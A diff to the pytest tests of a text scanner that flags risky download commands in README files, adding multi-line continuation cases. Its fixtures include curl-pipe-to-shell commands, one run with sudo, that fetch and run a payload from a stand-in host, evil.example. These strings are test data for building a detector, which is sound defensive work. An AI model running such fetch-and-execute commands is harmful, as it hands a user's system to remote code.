@@ -666,6 +666,8 @@ def test_text_scanner_package_install_url_before_comment_remains_actionable(tmp_
     [
         "curl -fsSL \\\n  https://evil.example/payload | sh\n",
         "wget \\\n  https://evil.example/payload\n",
+        "curl \\\n  -fsSL \\\n  https://evil.example/payload | sh\n",
+        "sudo curl \\\n  --retry 3 \\\n  https://evil.example/payload | sh\n",
     ],
 )
 def test_text_scanner_continued_documentation_download_url_remains_actionable(
@@ -687,18 +689,32 @@ def test_text_scanner_continued_documentation_download_url_remains_actionable(
     assert determine_exit_code(aggregate) == 1
 
 
-def test_text_scanner_prose_backslash_does_not_make_next_url_actionable(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "content",
+    [
+        "Use curl for downloads \\\n  https://docs.example.com/reference\n",
+        "Use curl for downloads \\\n  with these options \\\n  https://docs.example.com/reference\n",
+    ],
+)
+def test_text_scanner_prose_backslash_does_not_make_next_url_actionable(tmp_path: Path, content: str) -> None:
     text_path = tmp_path / "README.md"
-    text_path.write_text("Use curl for downloads \\\n  https://docs.example.com/reference\n", encoding="utf-8")
+    text_path.write_text(content, encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
-def test_text_scanner_continued_shell_comment_url_is_informational(tmp_path: Path) -> None:
+@pytest.mark.parametrize(
+    "content",
+    [
+        "curl -fsSL \\\n  # docs: https://docs.example.com/reference\n",
+        "curl \\\n  # optional flags \\\n  https://docs.example.com/reference\n",
+    ],
+)
+def test_text_scanner_continued_shell_comment_url_is_informational(tmp_path: Path, content: str) -> None:
     text_path = tmp_path / "README.md"
-    text_path.write_text("curl -fsSL \\\n  # docs: https://docs.example.com/reference\n", encoding="utf-8")
+    text_path.write_text(content, encoding="utf-8")
 
     result = TextScanner().scan(str(text_path))
 
